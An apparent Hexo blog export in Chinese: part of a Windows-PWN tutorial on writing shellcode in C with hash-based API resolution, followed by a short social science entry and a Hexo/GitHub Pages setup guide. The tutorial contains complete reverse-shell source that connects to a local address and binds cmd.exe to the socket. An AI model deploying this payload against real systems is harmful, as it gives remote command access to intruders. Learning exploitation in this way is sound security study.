<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[] = &#123; &#x27;I&#x27;, &#x27;\&#x27;&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27; &#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;g&#x27;, &#x27;\0&#x27; &#125;;</span><br></pre></td></tr></table></figure>

<p>但当字符串过长时，仍会将字符串放到.rdata节，这个就需要使用<code>python</code>脚本从<code>.rdata</code>中将字符串提取出来，同时修改重定位信息，以修复<code>shellcode</code>。</p>
</li>
</ul>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h3><p>编译选项</p>
<ul>
<li>关闭sdl</li>
<li>关闭安全检查 &#x2F;GS-</li>
<li>优化级别：&#x2F;O1(Minimize Size)</li>
<li>关闭自动内联：&#x2F;Ob1(Only __inline)</li>
<li>其它：&#x2F;Oi &#x2F;Os &#x2F;GL &#x2F;Gy</li>
</ul>
<p>链接选项</p>
<ul>
<li>常规<ul>
<li>&#x2F;INCREMENTAL:NO</li>
</ul>
</li>
<li>调试<ul>
<li>&#x2F;MAP(生成存储EXE结构信息的映射文件)（用于后期去除函数和不被使用的数据）</li>
<li>自定义映射文件名：*Map File Name: mapfile</li>
</ul>
</li>
<li>优化<ul>
<li>References: Yes(&#x2F;OPT:REF)</li>
<li>指定代码节中函数的顺序<ul>
<li>Enable COMPAT Folding: Yes(&#x2F;OPT:ICF)</li>
<li>Function Order: function_order.txt（指定必须出现在代码节中函数的顺序，我们将entryPoint放在第一个位置，具体要填的函数名可以查看 映射文件mapgfile获得。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><h3 id="getProcAddrByHash"><a href="#getProcAddrByHash" class="headerlink" title="getProcAddrByHash"></a>getProcAddrByHash</h3><p>fs-&gt;TEB </p>
<p>fs:[30h]-&gt;PEB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _TEB @$teb</span><br><span class="line">dt _PEB @$peb</span><br><span class="line">dt _PEB_LDR_DATA (xxx)</span><br><span class="line">dt _LIST_ENTRY (xxx)</span><br><span class="line">dt _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>

<p>部分命令结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _TEB @$teb</span><br><span class="line">ntdll!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : (null) </span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : (null) </span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : <span class="number">0x00da5548</span> Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : <span class="number">0x009a0000</span> _PEB</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x008 InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x018 DllBase          : Ptr32 Void</span><br><span class="line">   +0x01c EntryPoint       : Ptr32 Void</span><br><span class="line">   +0x020 SizeOfImage      : Uint4B</span><br><span class="line">   +0x024 FullDllName      : _UNICODE_STRING</span><br><span class="line">   +0x02c BaseDllName      : _UNICODE_STRING</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>涉及到的结构体的关系图如下：</p>
<p>【TODO!】</p>
<p>代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">getHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">	DWORD h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*str) &#123;</span><br><span class="line">		h = (h &gt;&gt; <span class="number">13</span>) | (h &lt;&lt; (<span class="number">32</span><span class="number">-13</span>)); <span class="comment">//ROR h,13</span></span><br><span class="line">		h += *str &gt;= <span class="string">&#x27;a&#x27;</span> ? *str<span class="number">-32</span> : *str; <span class="comment">// 转换为大写字母</span></span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">getFunctionHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* moduleName, <span class="type">const</span> <span class="type">char</span>* funtionName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getHash(moduleName) + getHash(functionName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_inline PEB* <span class="title function_">getPEB</span><span class="params">()</span> &#123;</span><br><span class="line">    PEB *p;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">30</span>h] <span class="comment">// fs指向TEB, fs:[30h]指向PEB</span></span><br><span class="line">        mov p, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_inline LDR_DATA_TABLE_ENTRY* <span class="title function_">getDataTableEntry</span><span class="params">(LIST_ENTRY* ptr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">getProcAddrByHash</span><span class="params">(DWORD hash)</span> &#123;</span><br><span class="line">    <span class="comment">// 首先获取PEB(Process Environment Block)的地址</span></span><br><span class="line">    PEB* peb = getPEB();</span><br><span class="line">    LIST_ENTRY* first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">    LIST_ENTRY* ptr = first;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);</span><br><span class="line">        ptr = ptr-&gt;Flink;</span><br><span class="line">        BYTE* baseAddress = (Byte*)dte-&gt;DllBase;</span><br><span class="line">        <span class="keyword">if</span>(!baseAddress)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;</span><br><span class="line">        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader-&gt;e_lfanew);</span><br><span class="line">        </span><br><span class="line">        DWORD iedRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">        <span class="keyword">if</span>(!iedRVA) <span class="comment">// 没有导出表</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA);</span><br><span class="line">        <span class="type">char</span>* moduleName = (<span class="type">char</span>*)(baseAddress + ied-&gt;Name);</span><br><span class="line">        DWORD moduleHash = getHash(moduleName);</span><br><span class="line">        </span><br><span class="line">        DWORD *nameRVAs = (DWORD *)(baseAddress + ied-&gt;AddressOfNames);</span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; ied-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">            <span class="type">char</span> *functionName = (<span class="type">char</span> *)(baseAddress + nameRVAs[i]);</span><br><span class="line">            <span class="keyword">if</span>(hash == moduleHash + getHash(functionName)) &#123;</span><br><span class="line">                WORD oridinal = ((WORD *)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];</span><br><span class="line">                DWORD functionRVA = ((DWORD *)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];</span><br><span class="line">                <span class="keyword">return</span> baseAddress + functionRVA;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">while</span>(ptr != first);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DefineFuncPtr"><a href="#DefineFuncPtr" class="headerlink" title="DefineFuncPtr"></a>DefineFuncPtr</h3><blockquote>
<p>一个宏，便于定义已导入的函数</p>
</blockquote>
<p>实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DefineFuncPtr(name)	decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)</span></span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD hash = getFunctionHash(<span class="string">&quot;ws2_32.dll&quot;</span>, <span class="string">&quot;WSAStartup&quot;</span>); <span class="comment">// 得到0x2ddcd540</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAStartup	0x2ddcd540</span></span><br><span class="line">DefineFuncPtr(WSAStartup);</span><br></pre></td></tr></table></figure>

<p>之后就可以使用<code>My_WSAStartup</code>调用<code>WSAStartup</code>函数。</p>
<blockquote>
<p>注：在使用前，要确保所需函数所在的模块，已经被加载到内存中。</p>
<p>可以主动调用LoadLibrary函数，以确保这一点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DefineFuncPtr(LoadLibrarya); <span class="comment">// 在kernel32.dll中，一定已经被加载</span></span><br><span class="line">My_LoadLibrary(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="entryPoint"><a href="#entryPoint" class="headerlink" title="entryPoint"></a>entryPoint</h3><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><h3 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h3><h3 id="shellcode范例"><a href="#shellcode范例" class="headerlink" title="shellcode范例"></a>shellcode范例</h3><p>一个简单的<code>reverse shell</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span>               <span class="comment">// must preceed #include &lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> htons(A) ((((WORD)(A) &amp; 0xff00) &gt;&gt; 8) | (((WORD)(A) &amp; 0x00ff) &lt;&lt; 8))</span></span><br><span class="line"> </span><br><span class="line">_inline PEB *<span class="title function_">getPEB</span><span class="params">()</span> &#123;</span><br><span class="line">    PEB *p;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov     eax, fs:[<span class="number">30</span>h]</span><br><span class="line">        mov     p, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">DWORD <span class="title function_">getHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    DWORD h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        h = (h &gt;&gt; <span class="number">13</span>) | (h &lt;&lt; (<span class="number">32</span> - <span class="number">13</span>));       <span class="comment">// ROR h, 13</span></span><br><span class="line">        h += *str &gt;= <span class="string">&#x27;a&#x27;</span> ? *str - <span class="number">32</span> : *str;    <span class="comment">// convert the character to uppercase</span></span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">DWORD <span class="title function_">getFunctionHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *moduleName, <span class="type">const</span> <span class="type">char</span> *functionName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getHash(moduleName) + getHash(functionName);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">LDR_DATA_TABLE_ENTRY *<span class="title function_">getDataTableEntry</span><span class="params">(<span class="type">const</span> LIST_ENTRY *ptr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    <span class="keyword">return</span> (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> This function doesn&#x27;t work with forwarders. For instance, kernel32.ExitThread forwards to</span></span><br><span class="line"><span class="comment">//       ntdll.RtlExitUserThread. The solution is to follow the forwards manually.</span></span><br><span class="line">PVOID <span class="title function_">getProcAddrByHash</span><span class="params">(DWORD hash)</span> &#123;</span><br><span class="line">    PEB *peb = getPEB();</span><br><span class="line">    LIST_ENTRY *first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">    LIST_ENTRY *ptr = first;</span><br><span class="line">    <span class="keyword">do</span> &#123;                            <span class="comment">// for each module</span></span><br><span class="line">        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);</span><br><span class="line">        ptr = ptr-&gt;Flink;</span><br><span class="line"> </span><br><span class="line">        BYTE *baseAddress = (BYTE *)dte-&gt;DllBase;</span><br><span class="line">        <span class="keyword">if</span> (!baseAddress)           <span class="comment">// invalid module(???)</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;</span><br><span class="line">        IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader-&gt;e_lfanew);</span><br><span class="line">        DWORD iedRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">        <span class="keyword">if</span> (!iedRVA)                <span class="comment">// Export Directory not present</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);</span><br><span class="line">        <span class="type">char</span> *moduleName = (<span class="type">char</span> *)(baseAddress + ied-&gt;Name);</span><br><span class="line">        DWORD moduleHash = getHash(moduleName);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// The arrays pointed to by AddressOfNames and AddressOfNameOrdinals run in parallel, i.e. the i-th</span></span><br><span class="line">        <span class="comment">// element of both arrays refer to the same function. The first array specifies the name whereas</span></span><br><span class="line">        <span class="comment">// the second the ordinal. This ordinal can then be used as an index in the array pointed to by</span></span><br><span class="line">        <span class="comment">// AddressOfFunctions to find the entry point of the function.</span></span><br><span class="line">        DWORD *nameRVAs = (DWORD *)(baseAddress + ied-&gt;AddressOfNames);</span><br><span class="line">        <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; ied-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">            <span class="type">char</span> *functionName = (<span class="type">char</span> *)(baseAddress + nameRVAs[i]);</span><br><span class="line">            <span class="keyword">if</span> (hash == moduleHash + getHash(functionName)) &#123;</span><br><span class="line">                WORD ordinal = ((WORD *)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];</span><br><span class="line">                DWORD functionRVA = ((DWORD *)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];</span><br><span class="line">                <span class="keyword">return</span> baseAddress + functionRVA;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ptr != first);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;            <span class="comment">// address not found</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_LoadLibraryA           0xf8b7108d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAStartup             0x2ddcd540</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSACleanup             0x0b9d13bc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSASocketA             0x9fd4f16f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAConnect             0xa50da182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_CreateProcessA         0x231cbe70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_inet_ntoa              0x1b73fed1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_inet_addr              0x011bfae2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_getaddrinfo            0xdc2953c9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_getnameinfo            0x5c1c856e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_ExitThread             0x4b3153e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WaitForSingleObject    0xca8e9498</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DefineFuncPtr(name)     decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">entryPoint</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//  printf(&quot;0x%08x\n&quot;, getFunctionHash(&quot;kernel32.dll&quot;, &quot;WaitForSingleObject&quot;));</span></span><br><span class="line"><span class="comment">//  return 0;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> we should call WSACleanup() and freeaddrinfo() (after getaddrinfo()), but</span></span><br><span class="line">    <span class="comment">//       they&#x27;re not strictly needed.</span></span><br><span class="line"> </span><br><span class="line">    DefineFuncPtr(LoadLibraryA);</span><br><span class="line"> </span><br><span class="line">    My_LoadLibraryA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    DefineFuncPtr(WSAStartup);</span><br><span class="line">    DefineFuncPtr(WSASocketA);</span><br><span class="line">    DefineFuncPtr(WSAConnect);</span><br><span class="line">    DefineFuncPtr(CreateProcessA);</span><br><span class="line">    DefineFuncPtr(inet_ntoa);</span><br><span class="line">    DefineFuncPtr(inet_addr);</span><br><span class="line">    DefineFuncPtr(getaddrinfo);</span><br><span class="line">    DefineFuncPtr(getnameinfo);</span><br><span class="line">    DefineFuncPtr(ExitThread);</span><br><span class="line">    DefineFuncPtr(WaitForSingleObject);</span><br><span class="line"> </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hostName = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> hostPort = <span class="number">123</span>;</span><br><span class="line"> </span><br><span class="line">    WSADATA wsaData;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (My_WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData))</span><br><span class="line">        <span class="keyword">goto</span> __end;         <span class="comment">// error</span></span><br><span class="line">    SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line"> </span><br><span class="line">    addrinfo *result;</span><br><span class="line">    <span class="keyword">if</span> (My_getaddrinfo(hostName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;result))</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line">    <span class="type">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">    My_getnameinfo(result-&gt;ai_addr, result-&gt;ai_addrlen, ip_addr, <span class="keyword">sizeof</span>(ip_addr), <span class="literal">NULL</span>, <span class="number">0</span>, NI_NUMERICHOST);</span><br><span class="line"> </span><br><span class="line">    SOCKADDR_IN remoteAddr;</span><br><span class="line">    remoteAddr.sin_family = AF_INET;</span><br><span class="line">    remoteAddr.sin_port = htons(hostPort);</span><br><span class="line">    remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (My_WSAConnect(sock, (SOCKADDR *)&amp;remoteAddr, <span class="keyword">sizeof</span>(remoteAddr), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line"> </span><br><span class="line">    STARTUPINFOA sInfo;</span><br><span class="line">    PROCESS_INFORMATION procInfo;</span><br><span class="line">    SecureZeroMemory(&amp;sInfo, <span class="keyword">sizeof</span>(sInfo));        <span class="comment">// avoids a call to _memset</span></span><br><span class="line">    sInfo.cb = <span class="keyword">sizeof</span>(sInfo);</span><br><span class="line">    sInfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;</span><br><span class="line">    My_CreateProcessA(<span class="literal">NULL</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sInfo, &amp;procInfo);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Waits for the process to finish.</span></span><br><span class="line">    My_WaitForSingleObject(procInfo.hProcess, INFINITE);</span><br><span class="line"> </span><br><span class="line">__end:</span><br><span class="line">    My_ExitThread(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> entryPoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p>TODO!</p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>社科知识</title>
    <url>/2023/10/23/%E7%A4%BE%E7%A7%91/%E7%A4%BE%E7%A7%91%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>介绍一些基础的社科知识，主要包括源自启蒙时代的一系列概念，以及一些我认为有价值的观点的介绍。</p>
<span id="more"></span>



<p><a href="https://www.zhihu.com/question/626921129/answer/3258747740?utm_campaign=&utm_medium=social&utm_oi=1323630258282000384&utm_psn=1699919819036532736&utm_source=qq">马克思对人性的观点</a></p>
<ul>
<li>民主程度，取决于民众对官僚的威慑力度。</li>
<li>人性随生产力变化而变化，制度随生产力变化而变化；而不是不变的人性形成不变的制度。</li>
</ul>
]]></content>
      <categories>
        <category>社科知识</category>
      </categories>
  </entry>
  <entry>
    <title>Create a Blog with Hexo</title>
    <url>/2023/10/17/else/Create-a-Blog-with-Hexo/</url>
    <content><![CDATA[<p><code>Windows</code>下使用 <code>Hexo</code> 和 <code>github pages</code> 快速构建个人博客，</p>
<p>并针对<code>next</code>主题进行如下配置：修改语言、切换小主题、添加分类标签、文章折叠、本地搜索等。</p>
<span id="more"></span>

<h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><ul>
<li><p><a href="https://nodejs.org/en">nodejs</a></p>
</li>
<li><p><a href="https://git-scm.com/download/win">git</a></p>
</li>
</ul>
<p>从官网下载并安装好 <code>nodejs</code> 和 <code>git</code>。</p>
<p>执行以下命令，若返回版本号，则表明安装成功。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">node <span class="literal">--version</span></span><br><span class="line">git <span class="literal">--version</span></span><br></pre></td></tr></table></figure>

<h2 id="github仓库"><a href="#github仓库" class="headerlink" title="github仓库"></a>github仓库</h2><p>仓库名最好为 <code>用户名.github.io</code>，这样访问网站时用的<code>URL</code>是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名.github.io</span><br></pre></td></tr></table></figure>

<p>不然得使用以下域名进行访问</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">用户名.github.io/仓库名</span><br></pre></td></tr></table></figure>

<h2 id="设置ssh"><a href="#设置ssh" class="headerlink" title="设置ssh"></a>设置ssh</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh<span class="literal">-keygen</span> <span class="literal">-t</span> rsa <span class="literal">-C</span> <span class="string">&quot;xxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>将本地<code>id_rsa.pub</code>的内容，拷贝到github设置中的<code>SSH and GPG keys</code>。</p>
<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure>

<p>新建并初始化一个目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir blog</span><br><span class="line">hexo init blog    # 初始化</span><br><span class="line">cd blog</span><br><span class="line">npm install    # 安装组件</span><br></pre></td></tr></table></figure>

<p>本地预览：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hexo g    <span class="comment"># 生成页面</span></span><br><span class="line">hexo s    <span class="comment"># 启动预览</span></span><br><span class="line"><span class="comment"># 若预览端口(4000)被占用，可使用hexo server -p 5000来更改端口号</span></span><br><span class="line"><span class="comment"># 页面是热更新的，更改 md 文件后刷新页面，就能看到修改后的内容</span></span><br></pre></td></tr></table></figure>

<p>本地博客测试成功后，将其上传到github部署</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装hexo-deployer-git</span></span><br><span class="line">npm install hexo-deployer-git --save </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改_config.yml文件末尾的Deployment部分为</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用如下命令上传到github，就可以使用https://用户名.github.io进行访问</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h2 id="新建博文"><a href="#新建博文" class="headerlink" title="新建博文"></a>新建博文</h2><h3 id="自动创建"><a href="#自动创建" class="headerlink" title="自动创建"></a>自动创建</h3><p>进入博客所在目录，执行以下命令创建博文，在source&#x2F;_posts目录下能看到一个My-New-Post.md文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;My New Post&quot;</span><br></pre></td></tr></table></figure>

<h3 id="手动创建"><a href="#手动创建" class="headerlink" title="手动创建"></a>手动创建</h3><p>在source&#x2F;_posts目录下新建一个md文件，并在文件开头加入如下格式的front-matter</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019/3/26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line"><span class="bullet">-</span> Diary</span><br><span class="line">tags: # 标签</span><br><span class="line"><span class="bullet">-</span> PS3</span><br><span class="line"><span class="section">- Games</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure>

<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p><a href="https://hexo.io/themes/">hexo themes</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd blog</span><br><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br><span class="line">npm install --save hexo-renderer-pug    # 安装依赖</span><br></pre></td></tr></table></figure>

<h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h2><p>在根目录创建 <code>_config.next.yaml</code> 文件，并将<code>themes\next\_config.yaml</code>文件的内容复制到里面，现在共两个配置文件</p>
<ul>
<li><code>_config.yaml</code> : Hexo站点配置</li>
<li><code>_config.[主题名].yaml</code> 这里以 <code>_config.next.yaml</code> 为例 ： 主题配置</li>
</ul>
